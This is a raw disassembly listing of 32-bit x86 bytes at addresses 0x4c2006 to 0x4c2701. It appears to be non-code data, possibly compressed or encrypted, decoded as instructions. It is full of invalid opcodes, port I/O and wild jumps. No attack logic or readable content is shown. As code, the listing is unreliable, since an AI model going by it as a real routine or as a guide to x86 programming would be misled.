  4c2006:	jo     0x4c206f
  4c2008:	test   BYTE PTR [edx],ah
  4c200a:	cmp    esi,esp
  4c200c:	lods   eax,DWORD PTR cs:[esi]
  4c200e:	mov    ebx,0xc1c72ac0
  4c2013:	sub    eax,0x6d818d39
  4c2018:	or     BYTE PTR ds:0x42935268,cl
  4c201e:	push   cs
  4c201f:	imul   ecx,DWORD PTR [edi-0x6ec5e8c5],0x526116af
  4c2029:	mov    al,0x4
  4c202b:	jno    0x4c200a
  4c202d:	aaa    
  4c202e:	jp     0x4c204f
  4c2030:	fdiv   st,st(3)
  4c2032:	in     al,dx
  4c2033:	jnp    0x4c2010
  4c2035:	sub    dl,BYTE PTR [ecx-0x22]
  4c2038:	xchg   edi,eax
  4c2039:	dec    esp
  4c203a:	enter  0x7e7b,0x7d
  4c203e:	jmp    0x4c20ad
  4c2040:	dec    ebx
  4c2041:	inc    edi
  4c2042:	cmp    BYTE PTR [edx-0x547d270e],al
  4c2048:	mov    ch,BYTE PTR [esi+edx*1+0x532a5005]
  4c204f:	jo     0x4c2098
  4c2051:	retf   0xec36
  4c2054:	adc    DWORD PTR [esi],ecx
  4c2056:	xchg   edi,eax
  4c2057:	idiv   DWORD PTR [eax]
  4c2059:	mov    ch,0x7e
  4c205b:	bound  ecx,QWORD PTR [ebp+0x309a08ef]
  4c2061:	lods   al,BYTE PTR ds:[esi]
  4c2062:	arpl   WORD PTR [ecx-0x69e7e277],si
  4c2068:	rcpps  xmm6,XMMWORD PTR [ebx+0x6a821111]
  4c206f:	scas   al,BYTE PTR es:[edi]
  4c2070:	mov    cl,0x42
  4c2072:	js     0x4c2022
  4c2074:	mov    cl,0x79
  4c2076:	push   ebp
  4c2077:	test   ch,bl
  4c2079:	es retf 
  4c207b:	mov    bl,0x6
  4c207d:	scas   al,BYTE PTR es:[edi]
  4c207e:	mov    ds:0x2253d9a4,al
  4c2083:	mov    esi,0x51f946a0
  4c2088:	or     eax,DWORD PTR [esi-0x712679b2]
  4c208e:	fimul  WORD PTR [edx]
  4c2090:	add    ah,BYTE PTR [edx]
  4c2092:	dec    ebp
  4c2093:	sbb    dh,BYTE PTR [eax]
  4c2095:	xor    DWORD PTR [ecx],ebp
  4c2097:	jl     0x4c20f6
  4c2099:	mov    al,0x27
  4c209b:	mov    al,ds:0xd0c92fce
  4c20a0:	push   cs
  4c20a1:	jmp    0x81dd5dad
  4c20a6:	sbb    al,0x83
  4c20a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4c20a9:	pop    es
  4c20aa:	sub    eax,eax
  4c20ac:	mov    bl,0xcb
  4c20ae:	push   es
  4c20af:	mov    ebx,0x41b7c0ae
  4c20b4:	pop    ebx
  4c20b5:	xor    ecx,ebx
  4c20b7:	imul   si,WORD PTR [edi-0x5e6a92b9],0xb721
  4c20c0:	add    BYTE PTR [esi-0x7dfaf78],dh
  4c20c6:	or     eax,0x257bec3c
  4c20cb:	mov    gs,WORD PTR [esi-0x22]
  4c20ce:	adc    DWORD PTR [esi-0x78d63d26],0x8c0bfb38
  4c20d8:	inc    ebp
  4c20d9:	je     0x4c205f
  4c20db:	aas    
  4c20dc:	push   eax
  4c20dd:	aam    0x60
  4c20df:	dec    ebp
  4c20e0:	mov    ch,0xc
  4c20e2:	lahf   
  4c20e3:	das    
  4c20e4:	arpl   WORD PTR [ebx],ax
  4c20e6:	dec    eax
  4c20e7:	les    edx,FWORD PTR [ebp+0x39]
  4c20ea:	popa   
  4c20eb:	js     0x4c2148
  4c20ed:	inc    eax
  4c20ee:	arpl   WORD PTR [edi-0x52],di
  4c20f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4c20f2:	inc    ebx
  4c20f3:	mov    dh,BYTE PTR [esi]
  4c20f5:	add    BYTE PTR [edi],dl
  4c20f7:	or     eax,DWORD PTR ds:0xd9b601eb
  4c20fd:	stc    
  4c20fe:	shr    dh,0x3d
  4c2101:	outs   dx,BYTE PTR ds:[esi]
  4c2102:	popf   
  4c2103:	jp     0x4c20d1
  4c2105:	xchg   esp,eax
  4c2106:	iret   
  4c2107:	mov    DWORD PTR [edi+0x521cb914],0xc9390709
  4c2111:	shl    BYTE PTR [eax+0x10],0x2b
  4c2115:	push   ebx
  4c2116:	add    BYTE PTR [esi-0x333be453],ch
  4c211c:	add    BYTE PTR [edx],cl
  4c211e:	adc    dh,BYTE PTR ds:0xd71db9b5
  4c2124:	adc    DWORD PTR [ebx],eax
  4c2126:	or     BYTE PTR [esi],bl
  4c2128:	jne    0x4c2158
  4c212a:	push   esi
  4c212b:	fwait
  4c212c:	dec    edi
  4c212d:	rcr    edx,cl
  4c212f:	inc    eax
  4c2130:	or     ebp,ebx
  4c2132:	pusha  
  4c2133:	enter  0x4115,0x53
  4c2137:	pop    ebp
  4c2138:	or     BYTE PTR [ebx+0xb],ah
  4c213b:	leave  
  4c213c:	rcr    DWORD PTR [eax],0x5c
  4c213f:	cmp    BYTE PTR [ecx+0xec05a26],dl
  4c2145:	lahf   
  4c2146:	loope  0x4c21b5
  4c2148:	pop    esp
  4c2149:	mov    eax,eax
  4c214b:	out    dx,eax
  4c214c:	mov    esp,0x68e30e91
  4c2151:	adc    BYTE PTR es:[esi+eax*1],dl
  4c2155:	sbb    BYTE PTR [esi],dl
  4c2157:	(bad)  
  4c2158:	mov    ah,0xf0
  4c215a:	sbb    al,0x34
  4c215c:	sbb    BYTE PTR [ebx+0x1ed7d41],cl
  4c2162:	mov    cl,0x8
  4c2164:	fbld   TBYTE PTR [edx+edi*2]
  4c2167:	dec    ebx
  4c2168:	jge    0x4c2124
  4c216a:	cmp    eax,0x88da431
  4c216f:	daa    
  4c2170:	jbe    0x4c21a8
  4c2172:	fsubrp st(0),st
  4c2174:	inc    esi
  4c2175:	mov    edx,0xce145c0d
  4c217a:	outs   dx,DWORD PTR ds:[esi]
  4c217b:	out    dx,al
  4c217c:	xchg   DWORD PTR [ebp+0x15],esi
  4c217f:	cmc    
  4c2180:	sbb    dh,BYTE PTR [eax+ecx*4+0x1d]
  4c2184:	xor    DWORD PTR [ecx-0x50],0xa3c5182a
  4c218b:	xor    al,bl
  4c218d:	into   
  4c218e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4c218f:	loopne 0x4c21e4
  4c2191:	aas    
  4c2192:	fucom  st(0)
  4c2194:	mov    ecx,0x75115a15
  4c2199:	imul   eax,DWORD PTR [ebx+0x78],0x34716444
  4c21a0:	jb     0x4c21e7
  4c21a2:	sub    DWORD PTR [ecx-0x317581c8],ebp
  4c21a8:	and    DWORD PTR [ebx],ecx
  4c21aa:	mov    ecx,0x2d04c31c
  4c21af:	push   ss
  4c21b0:	xor    BYTE PTR [edx+0x6],al
  4c21b3:	push   0x6b12747
  4c21b8:	mov    BYTE PTR fs:[eax-0x76fcfadf],dl
  4c21bf:	stos   BYTE PTR es:[edi],al
  4c21c0:	fiadd  DWORD PTR [edx]
  4c21c2:	add    DWORD PTR [esi+0x22],edi
  4c21c5:	add    ch,BYTE PTR [edx+0x7]
  4c21c8:	sub    ebx,DWORD PTR [ebx+0x42]
  4c21cb:	add    BYTE PTR [ecx+edi*2],bh
  4c21ce:	sahf   
  4c21cf:	out    0x79,eax
  4c21d1:	dec    ebp
  4c21d2:	pop    esi
  4c21d3:	outs   dx,DWORD PTR ds:[esi]
  4c21d4:	adc    BYTE PTR [ecx-0x186189e1],0xa2
  4c21db:	ror    ah,0x1
  4c21de:	popf   
  4c21df:	adc    al,BYTE PTR [ecx+0x0]
  4c21e2:	(bad)  
  4c21e3:	outs   dx,BYTE PTR ds:[esi]
  4c21e4:	(bad)  ss:[eax+0x6af40653]
  4c21eb:	and    eax,0x41f25075
  4c21f0:	aaa    
  4c21f1:	ret    
  4c21f2:	bnd jge 0x4c21d0
  4c21f5:	mov    dh,0x38
  4c21f7:	dec    esi
  4c21f8:	push   ecx
  4c21f9:	push   esp
  4c21fa:	pop    ds
  4c21fb:	add    ecx,edi
  4c21fd:	adc    al,0x2
  4c21ff:	pop    ds
  4c2200:	shr    BYTE PTR [esi],0xe4
  4c2203:	inc    eax
  4c2204:	ds inc esi
  4c2206:	sbb    eax,DWORD PTR [ecx]
  4c2208:	add    BYTE PTR [eax],bl
  4c220a:	adc    al,BYTE PTR [edx+0x2e]
  4c220d:	in     al,0x42
  4c220f:	adc    al,0x15
  4c2211:	in     al,0x42
  4c2213:	cs in  al,0x16
  4c2216:	adc    ebx,DWORD PTR [ecx]
  4c2218:	(bad)  
  4c2219:	inc    DWORD PTR [edx+0x2e]
  4c221c:	or     eax,0xb722bcc5
  4c2221:	push   0xa2101b4e
  4c2226:	mov    esp,0x4000aa00
  4c222b:	fadd   st,st(5)
  4c222d:	cs in  al,0x47
  4c2230:	jo     0x4c21f9
  4c2232:	or     ebx,DWORD PTR [edi+0xa]
  4c2235:	pop    ds
  4c2236:	pop    esi
  4c2237:	enter  0xb90b,0xf
  4c223b:	add    BYTE PTR [eax],al
  4c223d:	add    al,0x2
  4c223f:	div    bh
  4c2241:	inc    DWORD PTR [eax-0x7c]
  4c2244:	mov    dl,0x96
  4c2246:	mov    cl,0xb4
  4c2248:	mov    edx,0x9cb6101a
  4c224d:	mov    esi,0x83071d34
  4c2252:	pop    ds
  4c2253:	paddd  mm0,QWORD PTR [edx+0x2e]
  4c2257:	mov    DWORD PTR [eax+0x77fd523],eax
  4c225d:	push   ds
  4c225e:	scas   al,BYTE PTR es:[edi]
  4c225f:	sub    eax,0x9005ff6
  4c2264:	retf   0xc72e
  4c2267:	adc    eax,DWORD PTR [eax+0x327bf809]
  4c226d:	mov    edi,0xe18b4a3e
  4c2272:	iret   
  4c2273:	mov    edi,DWORD PTR [ebx+0x1ab0c30]
  4c2279:	mov    edi,0x8915f366
  4c227e:	sti    
  4c227f:	push   esi
  4c2280:	int    0x48
  4c2282:	add    BYTE PTR [ebx+0x5f7fdd15],dl
  4c2288:	dec    eax
  4c2289:	cld    
  4c228a:	jmp    DWORD PTR [edx+0x61]
  4c228d:	and    BYTE PTR fs:[ecx+0x6c],ah
  4c2291:	ins    BYTE PTR es:[edi],dx
  4c2292:	outs   dx,DWORD PTR ds:[esi]
  4c2293:	arpl   WORD PTR [ecx+0x74],sp
  4c2296:	imul   ebp,DWORD PTR [edi+0x6e],0x45726f94
  4c229d:	js     0x4c2308
  4c229f:	out    dx,eax
  4c22a0:	push   0x5074eddb
  4c22a5:	jb     0x4c22c9
  4c22a7:	gs jae 0x4c231d
  4c22aa:	push   ds
  4c22ab:	ins    DWORD PTR es:[edi],dx
  4c22ac:	add    BYTE PTR [eax],cl
  4c22ae:	arpl   WORD PTR [edx],ax
  4c22b0:	add    BYTE PTR [edx+0x0],dh
  4c22b3:	gs sti 
  4c22b5:	mov    esi,0x2e027f9d
  4c22ba:	add    BYTE PTR [eax+eax*1+0x6c],ah
  4c22be:	add    BYTE PTR [ecx+0x0],ah
  4c22c1:	das    
  4c22c2:	add    BYTE PTR [eax+0xf],dh
  4c22c5:	ins    DWORD PTR es:[edi],dx
  4c22c6:	adc    ebx,esi
  4c22c8:	jnp    0x4c230d
  4c22ca:	call   0x3a4e853c
  4c22cf:	adc    ch,BYTE PTR [ebp+0xa]
  4c22d2:	jae    0x4c2271
  4c22d4:	cld    
  4c22d5:	leave  
  4c22d6:	repz add al,BYTE PTR [eax]
  4c22d9:	fs sub al,0x0
  4c22dc:	and    BYTE PTR [eax],al
  4c22de:	dec    ebp
  4c22df:	and    ch,ch
  4c22e1:	repnz fisttp QWORD PTR [esi+0x37923]
  4c22e8:	das    
  4c22e9:	das    
  4c22ea:	das    
  4c22eb:	and    eax,DWORD PTR [ebx+0x26b4ee93]
  4c22f1:	push   eax
  4c22f2:	cmovno eax,DWORD PTR [edx+eax*1+0x3b]
  4c22f7:	clc    
  4c22f8:	pop    esi
  4c22f9:	mov    ebx,0x62be0663
  4c22fe:	or     dh,BYTE PTR [edx+0x27]
  4c2301:	dec    esi
  4c2302:	ss jbe 0x4c232c
  4c2305:	mov    ebp,0x4f177e43
  4c230a:	dec    edx
  4c230b:	je     0x4c230d
  4c230d:	outs   dx,DWORD PTR ds:[esi]
  4c230e:	push   ebx
  4c230f:	push   cs
  4c2310:	jo     0x4c22ef
  4c2312:	mov    ebp,0x4b22dadf
  4c2317:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4c2318:	jne    0x4c231a
  4c231a:	addr16 push es
  4c231c:	jae    0x4c234c
  4c231e:	add    DWORD PTR [edx+0x37],ecx
  4c2321:	mov    ebx,0x6c167b6e
  4c2326:	out    dx,eax
  4c2327:	pop    ss
  4c2328:	outs   dx,BYTE PTR ds:[esi]
  4c2329:	dec    esi
  4c232a:	div    DWORD PTR [eax+0x5e]
  4c232d:	pop    ds
  4c232e:	faddp  st(1),st
  4c2330:	sub    DWORD PTR [ecx-0x19],0x4d
  4c2334:	fidiv  DWORD PTR [edx-0x4a]
  4c2337:	push   0x1ced65a9
  4c233c:	mov    ebx,0x5272967b
  4c2341:	outs   dx,DWORD PTR es:[esi]
  4c2343:	popa   
  4c2344:	and    edx,DWORD PTR [esi]
  4c2346:	mov    eax,fs
  4c2348:	and    BYTE PTR [edi+0x47],bl
  4c234b:	das    
  4c234c:	ins    DWORD PTR es:[edi],dx
  4c234d:	ins    BYTE PTR es:[edi],dx
  4c234e:	ror    DWORD PTR [eax],0x1f
  4c2351:	pop    es
  4c2352:	imul   edi
  4c2354:	lea    ebp,[ebp+0x63]
  4c2357:	mov    bh,0xcf
  4c2359:	jns    0x4c2352
  4c235b:	out    dx,eax
  4c235c:	out    0xdc,eax
  4c235e:	neg    dh
  4c2360:	mov    bh,0xcf
  4c2362:	(bad)  
  4c2363:	popa   
  4c2364:	sahf   
  4c2365:	jne    0x4c239d
  4c2367:	arpl   WORD PTR fs:[edi-0x2a],ax
  4c236b:	or     eax,0x1f5a0dae
  4c2370:	push   esp
  4c2371:	pop    edx
  4c2372:	inc    ebx
  4c2373:	jae    0x4c239c
  4c2375:	outs   dx,BYTE PTR ds:[esi]
  4c2376:	fcmovb st,st(1)
  4c2378:	mov    ebx,0xc3648e57
  4c237d:	sub    edx,DWORD PTR [edx+ecx*2-0x45]
  4c2381:	imul   esi,edi,0x6fe61fd6
  4c2387:	inc    edx
  4c2388:	addr16 push ebx
  4c238a:	ds pop ds
  4c238c:	mov    dh,0xb1
  4c238e:	ins    DWORD PTR es:[edi],dx
  4c238f:	pop    ebx
  4c2390:	neg    edi
  4c2392:	iret   
  4c2393:	mov    bh,0xff
  4c2395:	sbb    bl,bl
  4c2397:	(bad)  
  4c2398:	lahf   
  4c2399:	(bad)  
  4c239a:	jg     0x4c23e2
  4c239c:	dec    eax
  4c239d:	cmp    ch,BYTE PTR [ebp+0x6d]
  4c23a0:	out    dx,al
  4c23a1:	stc    
  4c23a2:	jns    0x4c2333
  4c23a4:	cmp    dh,BYTE PTR [edx+0x202c6400]
  4c23aa:	dec    ebp
  4c23ab:	and    BYTE PTR [ecx],dl
  4c23ad:	mov    ch,0xb8
  4c23af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4c23b0:	mov    ebp,0x16000079
  4c23b5:	das    
  4c23b6:	das    
  4c23b7:	adc    bh,bh
  4c23b9:	dec    ebp
  4c23ba:	jle    0x4c242d
  4c23bc:	shl    DWORD PTR [edi+0x65444106],1
  4c23c2:	push   ss
  4c23c3:	ins    DWORD PTR es:[edi],dx
  4c23c4:	bound  esp,QWORD PTR [ebp-0x47]
  4c23c7:	dec    esi
  4c23c8:	outs   dx,DWORD PTR ds:[esi]
  4c23c9:	jbe    0x4c23ea
  4c23cb:	imul   dh
  4c23cd:	(bad)  
  4c23ce:	pop    ss
  4c23cf:	dec    edi
  4c23d0:	arpl   WORD PTR [edi+ebp*2+0x15],si
  4c23d4:	push   ebx
  4c23d5:	gs jo  0x4c244c
  4c23d8:	sub    DWORD PTR [ecx+0x75],eax
  4c23db:	addr16 jne 0x4c239d
  4c23de:	push   0x307383ef
  4c23e3:	dec    edx
  4c23e4:	jne    0x4c2452
  4c23e6:	xchg   DWORD PTR [esi],ecx
  4c23e8:	outs   dx,BYTE PTR ds:[esi]
  4c23e9:	xchg   ecx,eax
  4c23ea:	inc    ecx
  4c23eb:	jo     0x4c245f
  4c23ed:	data16 jg 0x4c23e1
  4c23f0:	mov    ebp,DWORD PTR [ecx-0x79]
  4c23f3:	popa   
  4c23f4:	jb     0x4c2459
  4c23f6:	jg     0x4c245d
  4c23f8:	bound  esi,QWORD PTR [edx+0x75]
  4c23fb:	push   ss
  4c23fc:	inc    edi
  4c23fd:	out    0x9c,eax
  4c23ff:	mov    ebx,0x156e6177
  4c2404:	into   
  4c2405:	mov    edi,0x9c97a7af
  4c240a:	jae    0x4c23db
  4c240c:	cmp    DWORD PTR [edi-0x78869179],ecx
  4c2412:	jg     0x4c248b
  4c2414:	int3   
  4c2415:	fisttp QWORD PTR [ebp-0x1a]
  4c2418:	addr16 inc esi
  4c241a:	data16 jne 0x4c248f
  4c241d:	xor    BYTE PTR fs:[edi-0x52099044],bl
  4c2424:	std    
  4c2425:	adc    edx,DWORD PTR [eax+ebp*2+0x24]
  4c2429:	jae    0x4c2452
  4c242b:	push   edi
  4c242c:	gs fs clc 
  4c242f:	sbb    DWORD PTR [ebp+esi*2+0x6c],edx
  4c2433:	sti    
  4c2434:	cdq    
  4c2435:	adc    cx,WORD PTR [ebp-0x38]
  4c2439:	and    DWORD PTR [ebx+0x75],edx
  4c243c:	jbe    0xe785f2b8
  4c2442:	ja     0x4c24b3
  4c2444:	pop    edi
  4c2445:	dec    edi
  4c2446:	inc    edi
  4c2447:	aas    
  4c2448:	add    BYTE PTR [ebx-0x25],cl
  4c244b:	mov    ds:0x52083498,eax
  4c2450:	jp     0x4c245c
  4c2452:	dec    esp
  4c2453:	add    bl,bl
  4c2455:	iret   
  4c2456:	out    dx,al
  4c2457:	jmp    0xfa7e248f
  4c245c:	inc    esp
  4c245d:	adc    al,BYTE PTR [edx]
  4c245f:	fild   QWORD PTR [ebx+esi*2+0x6c]
  4c2463:	gs gs repnz push ebp
  4c2467:	sub    eax,0x74540f70
  4c246c:	push   esi
  4c246d:	test   BYTE PTR [ebp+0x17],dh
  4c2470:	inc    edi
  4c2471:	cdq    
  4c2472:	dec    esp
  4c2473:	pop    eax
  4c2474:	pop    ebp
  4c2475:	inc    ecx
  4c2476:	lods   eax,DWORD PTR ds:[esi]
  4c2477:	lds    edx,FWORD PTR [esi-0x50b4d6ba]
  4c247d:	sub    BYTE PTR [ebp-0x37],ah
  4c2480:	push   edx
  4c2481:	stos   DWORD PTR es:[edi],eax
  4c2482:	test   eax,0x52ca5296
  4c2487:	popf   
  4c2488:	xchg   edi,eax
  4c2489:	mov    dl,0x94
  4c248b:	push   edx
  4c248c:	xchg   ecx,eax
  4c248d:	test   DWORD PTR [ecx+0x4a],ebx
  4c2490:	sub    DWORD PTR [ebx+0x73],ecx
  4c2493:	push   esp
  4c2494:	retf   0x4a52
  4c2497:	imul   ebx,DWORD PTR [ebx-0x1],0x27
  4c249b:	inc    ebx
  4c249c:	dec    DWORD PTR [ecx+0x4a]
  4c249f:	dec    ebx
  4c24a0:	dec    esp
  4c24a1:	dec    ebp
  4c24a2:	dec    esi
  4c24a3:	dec    edi
  4c24a4:	es push esp
  4c24a6:	push   ebp
  4c24a7:	push   esi
  4c24a8:	push   edi
  4c24a9:	pop    eax
  4c24aa:	pop    ecx
  4c24ab:	pop    edx
  4c24ac:	pop    ebx
  4c24ad:	xor    ah,bh
  4c24af:	(bad)  
  4c24b0:	call   FWORD PTR [ebp+ebx*2+0x5e]
  4c24b4:	pop    edi
  4c24b5:	pusha  
  4c24b6:	popa   
  4c24b7:	bound  esp,QWORD PTR [ebx+0x64]
  4c24ba:	gs addr16 pushw 0x6a69
  4c24c0:	imul   ebp,DWORD PTR [ebp+ebp*2+0x6e],0x6f
  4c24c5:	jo     0x4c2538
  4c24c7:	add    bl,BYTE PTR [ebx+0x306fff5f]
  4c24cd:	jbe    0x4c2546
  4c24cf:	js     0x4c254a
  4c24d1:	jp     0x4c254e
  4c24d3:	jl     0x4c2552
  4c24d5:	jle    0x4c2556
  4c24d7:	add    BYTE PTR ds:0x88ce20e6,bh
  4c24dd:	sub    BYTE PTR [ebx-0xf],0xdb
  4c24e1:	and    edx,DWORD PTR [ebp+0x6e]
  4c24e4:	imul   ecx,DWORD PTR [edx+0x77],0x6e
  4c24e8:	and    BYTE PTR [ebp+0x78],ah
  4c24eb:	arpl   WORD PTR [edx+0x59],si
  4c24ee:	sar    BYTE PTR [ecx-0x22],0xec
  4c24f2:	ds xor al,0xe4
  4c24f5:	xlat   BYTE PTR ds:[ebx]
  4c24f6:	and    al,0x5b
  4c24f8:	add    edx,DWORD PTR [edx-0x9]
  4c24fb:	add    ebp,DWORD PTR [esi+0x77776d3e]
  4c2501:	add    eax,0xe31d1993
  4c2506:	outs   dx,BYTE PTR ds:[esi]
  4c2507:	xchg   esi,eax
  4c2508:	imul   edi,DWORD PTR ds:0x657b2bc0,0x3f729b32
  4c2512:	and    BYTE PTR [edi],al
  4c2514:	jbe    0x4c2565
  4c2516:	pop    ss
  4c2517:	fisttp WORD PTR [esi+ecx*8+0x53]
  4c251b:	add    dh,BYTE PTR [edi]
  4c251d:	or     eax,0xc3dab500
  4c2522:	mov    ds:0x9a49070a,eax
  4c2527:	inc    edi
  4c2528:	xor    esi,DWORD PTR [edi+0x576a3bda]
  4c252e:	dec    edi
  4c252f:	push   esi
  4c2530:	inc    ecx
  4c2531:	inc    ebx
  4c2532:	aas    
  4c2533:	add    DWORD PTR [esi-0x23],esi
  4c2536:	stc    
  4c2537:	mov    dl,BYTE PTR [esi]
  4c2539:	add    BYTE PTR ss:[eax],dh
  4c253c:	add    BYTE PTR [ebx],dh
  4c253e:	sub    ebp,DWORD PTR ds:0xabf55e4e
  4c2544:	xlat   BYTE PTR ds:[ebx]
  4c2545:	scas   al,BYTE PTR es:[edi]
  4c2546:	je     0x4c24f7
  4c2548:	mov    edi,0x3d20eb20
  4c254d:	out    dx,eax
  4c254e:	imul   esi,eax,0xffffffab
  4c2551:	aaa    
  4c2552:	dec    ebp
  4c2553:	jecxz  0x4c25a1
  4c2555:	arpl   WORD PTR cs:[eax+edi*2+0x7],sp
  4c255a:	fcomip st,st(7)
  4c255c:	daa    
  4c255d:	scas   ax,WORD PTR es:[edi]
  4c255f:	ins    DWORD PTR es:[edi],dx
  4c2560:	push   edi
  4c2561:	push   0x6112738a
  4c2566:	sbb    al,0xe0
  4c2568:	add    BYTE PTR [esi],cl
  4c256a:	pop    ebx
  4c256b:	cmp    eax,DWORD PTR [edi]
  4c256d:	(bad)  
  4c256f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4c2570:	pop    es
  4c2571:	ds jne 0x4c2523
  4c2574:	outs   dx,BYTE PTR ds:[esi]
  4c2575:	and    BYTE PTR ds:[edx],cl
  4c2578:	popa   
  4c2579:	out    dx,eax
  4c257a:	pop    ebx
  4c257b:	cmp    ecx,DWORD PTR [edi]
  4c257d:	jecxz  0x4c25f5
  4c257f:	xchg   edi,eax
  4c2580:	aas    
  4c2581:	imul   esi,DWORD PTR [ebx],0x69eda755
  4c2587:	ds ins BYTE PTR es:[edi],dx
  4c2589:	jp     0x4c25da
  4c258b:	jecxz  0x4c2597
  4c258d:	and    esi,DWORD PTR [edi-0x40210435]
  4c2593:	dec    edi
  4c2594:	fs arpl WORD PTR ds:[ebp-0x19],sp
  4c2599:	and    BYTE PTR [edi-0x7f],dh
  4c259c:	in     eax,dx
  4c259d:	jne    0x4c2579
  4c259f:	(bad)  
  4c25a0:	aas    
  4c25a1:	push   ss
  4c25a2:	outs   dx,DWORD PTR ds:[esi]
  4c25a3:	jmp    0x4c2594
  4c25a5:	xchg   edx,eax
  4c25a6:	out    dx,al
  4c25a7:	mov    edx,0xa3027037
  4c25ac:	arpl   WORD PTR [esi],bp
  4c25ae:	xor    cl,BYTE PTR [ecx-0x46]
  4c25b1:	mul    DWORD PTR [esi+0x7]
  4c25b4:	retf   
  4c25b5:	stos   DWORD PTR es:[edi],eax
  4c25b6:	ins    DWORD PTR es:[edi],dx
  4c25b7:	sub    dh,BYTE PTR [ebx+0x1f]
  4c25ba:	push   ebx
  4c25bb:	imul   esi,edi,0x60
  4c25be:	nop
  4c25bf:	loopne 0x4c256f
  4c25c1:	ja     0x4c2571
  4c25c3:	cmp    esi,DWORD PTR [edx-0x2d]
  4c25c6:	cmp    BYTE PTR [eax+0x67],bh
  4c25c9:	xor    BYTE PTR [ebx+0x77665646],0x61
  4c25d0:	adc    BYTE PTR [ecx],0x34
  4c25d3:	push   ebx
  4c25d4:	ins    BYTE PTR es:[edi],dx
  4c25d5:	mov    bl,0x8e
  4c25d7:	push   cs
  4c25d8:	jo     0x4c2632
  4c25da:	scas   al,BYTE PTR es:[edi]
  4c25db:	dec    edi
  4c25dc:	sub    eax,0x735ede97
  4c25e1:	loopne 0x4c25a0
  4c25e3:	mov    ?,WORD PTR [esi]
  4c25e5:	sub    BYTE PTR [esi],bl
  4c25e7:	sub    ch,BYTE PTR [edx+ebx*4+0x29]
  4c25eb:	popa   
  4c25ec:	add    al,0x2d
  4c25ee:	push   ds
  4c25ef:	jnp    0x4c25ec
  4c25f1:	arpl   WORD PTR [edi],sp
  4c25f3:	add    DWORD PTR [ebx],0xffffff86
  4c25f6:	sbb    DWORD PTR [edi+0x476e5361],0x8f38eded
  4c2600:	imul   ebp,DWORD PTR [edx+0x4f],0xb
  4c2604:	jae    0x4c2614
  4c2606:	push   ds
  4c2607:	jo     0x4c2679
  4c2609:	inc    esp
  4c260a:	daa    
  4c260b:	retf   0xcf69
  4c260e:	cmp    esp,esp
  4c2610:	sub    ch,BYTE PTR [esi]
  4c2612:	out    0xdf,eax
  4c2614:	xor    ch,BYTE PTR [esi+0x62]
  4c2617:	in     eax,dx
  4c2618:	ds fadd st(7),st
  4c261b:	je     0x4c265c
  4c261d:	adc    bh,BYTE PTR [ebx+0x68]
  4c2620:	sbb    al,dl
  4c2622:	jo     0x4c2629
  4c2624:	out    dx,eax
  4c2625:	lods   eax,DWORD PTR ds:[esi]
  4c2626:	js     0x4c269e
  4c2628:	arpl   WORD PTR [edi-0x24906145],di
  4c262e:	mov    dh,0x86
  4c2630:	fisttp DWORD PTR [edx-0x5c92ccad]
  4c2636:	iret   
  4c2637:	push   ebp
  4c2638:	sub    al,0x3a
  4c263a:	xchg   BYTE PTR [ecx],dh
  4c263c:	scas   eax,DWORD PTR es:[edi]
  4c263d:	fild   QWORD PTR [esi+0x6530d778]
  4c2643:	fild   WORD PTR [ebx-0x72]
  4c2646:	push   esp
  4c2647:	das    
  4c2648:	jb     0x4c26c2
  4c264a:	jo     0x4c2665
  4c264c:	(bad)  
  4c264d:	xor    eax,ebx
  4c264f:	fidivr DWORD PTR [edi]
  4c2651:	cs or  al,0x5
  4c2654:	add    esp,edx
  4c2656:	das    
  4c2657:	(bad)  
  4c2658:	xor    BYTE PTR [edi+ecx*1],al
  4c265b:	sub    DWORD PTR [eax+0xc836f27],ebx
  4c2661:	stc    
  4c2662:	bound  edx,QWORD PTR [edi]
  4c2664:	fs jg  0x4c2699
  4c2667:	add    BYTE PTR [eax],bh
  4c2669:	push   ss
  4c266a:	or     eax,0x61db5a9f
  4c266f:	sub    esp,DWORD PTR [ebp+0xb]
  4c2672:	ins    DWORD PTR es:[edi],dx
  4c2673:	push   ebp
  4c2674:	or     eax,0x5f3e071c
  4c2679:	sahf   
  4c267a:	aaa    
  4c267b:	rol    ecx,cl
  4c267d:	add    eax,0xc3777f15
  4c2682:	iret   
  4c2683:	test   DWORD PTR [eax+esi*4],ecx
  4c2686:	inc    esp
  4c2687:	fbstp  TBYTE PTR [esi]
  4c2689:	mov    ecx,0x4b5a35a0
  4c268e:	fbstp  TBYTE PTR fs:0xda2bbde
  4c2695:	scas   al,BYTE PTR es:[edi]
  4c2696:	jne    0x4c268f
  4c2698:	jbe    0x4c26f8
  4c269a:	jb     0x4c2622
  4c269c:	jne    0x4c26b9
  4c269e:	aad    0x6a
  4c26a0:	pop    edx
  4c26a1:	jae    0x4c26ba
  4c26a3:	mov    ds:0x60ae42ae,eax
  4c26a8:	jg     0x4c26de
  4c26aa:	pop    edi
  4c26ab:	outs   dx,DWORD PTR ds:[esi]
  4c26ac:	mov    DWORD PTR [ebx+0x7822abf6],0x1ba32f73
  4c26b6:	lods   eax,DWORD PTR ds:[esi]
  4c26b7:	adc    BYTE PTR ds:0x7f8b7317,0xdd
  4c26be:	sbb    eax,0x39ea1454
  4c26c3:	fild   QWORD PTR [edi-0x26]
  4c26c6:	inc    cl
  4c26c8:	add    ebx,ebx
  4c26ca:	push   ebp
  4c26cb:	lahf   
  4c26cc:	outs   dx,DWORD PTR ds:[esi]
  4c26cd:	aas    
  4c26ce:	or     cl,bh
  4c26d0:	and    DWORD PTR ds:0xaf63ac17,0x38
  4c26d7:	aaa    
  4c26d8:	jbe    0x4c26c6
  4c26da:	cmp    bh,BYTE PTR [ebx+edx*4-0x6e9848fa]
  4c26e1:	mov    ah,0x44
  4c26e3:	add    eax,0xdf378edf
  4c26e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4c26e9:	or     esi,DWORD PTR [eax+0x6d]
  4c26ec:	retf   
  4c26ed:	imul   esp,ebx,0x1d64ab72
  4c26f3:	mov    ds:0x6b075c76,eax
  4c26f8:	mov    edi,0xb122585f
  4c26fd:	add    bl,dl
  4c26ff:	cs popa 
  4c2701:	enter  0x73b5,0xc7
